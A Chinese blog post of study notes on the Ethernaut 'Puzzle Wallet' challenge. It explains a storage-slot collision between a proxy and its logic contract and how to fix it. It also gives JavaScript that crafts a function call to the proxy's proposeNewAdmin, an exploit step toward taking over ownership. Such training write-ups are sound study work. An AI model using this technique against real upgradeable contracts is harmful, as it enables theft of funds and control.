---
layout: post
title:  （笔记）PuzzleWallt中slot存储冲突以及函数签名的利用
categories: [Solidity,区块链安全,智能合约]
excerpt: slot冲突问题，利用未公开的代理合约函数ABI制造函数签名，并且调用....

---

## meet it

在打[Puzzle Wallet](https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f)时，对一些重点进行记录



- **slot冲突问题**
- **利用未公开的代理合约函数ABI制造函数签名，并且调用**

## slot冲突问题

proxy合约和PuzzleWallet合约的整个逻辑是数据分离：

proxy合约保存数据，PuzzleWallet合约保存代码逻辑，当合约更新时，只需要更改PuzzleWallet的地址，并且proxy延用当前保存的数据继续服务。

```solidity
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;  // slot 0
    address public admin; // slot 1
    }
    contract PuzzleWallet {
    address public owner; // slot 0 
    uint256 public maxBalance; // slot 1
    mapping(address => bool) public whitelisted; //slot 2
    mapping(address => uint256) public balances; // slot 3
    }
```

问题是，PuzzleProxy自己定义的pendingAdmin，admin 。那么当运行后，两个合约slot0 和 slot1 是重叠冲突的。 

意味着当我们修改pendingAdmin时，等同于修改了pendingAdmin和owner

解决方法是  PuzzleProxy 应该 和 PuzzleWallet  的变量应该同步，即使增加pendingAdmin和admin，也要如下：

````solidity
contract PuzzleProxy is UpgradeableProxy {
    address public owner; // slot 0 
    uint256 public maxBalance; // slot 1
    mapping(address => bool) public whitelisted; //slot 2
    mapping(address => uint256) public balances; // slot 3
    address public pendingAdmin;  // slot 4
    address public admin; // slot 5 
    }
````

## 利用未公开的代理合约函数ABI制造函数签名，并且调用

当我们用web3与合约交互，查看ABI，发现并没有proxy合约的函数，但我们知道字节码中肯定包含了proxy合约的函数。所以我们需要自己编辑ABI，制造函数签名去调用它的proposeNewAdmin函数。

```solidity
   function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }
```

下面是调用的JS：

```javascript
proposeNewAdminABI = {
    name:'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: "address",
            name:"_newAdmin"
        }
    ]
}
params = [player]
data = web3.eth.abi.encodeFunctionCall(proposeNewAdminABI,params)
await web3.eth.sendTransaction({from: player,to: contract.address,data})
```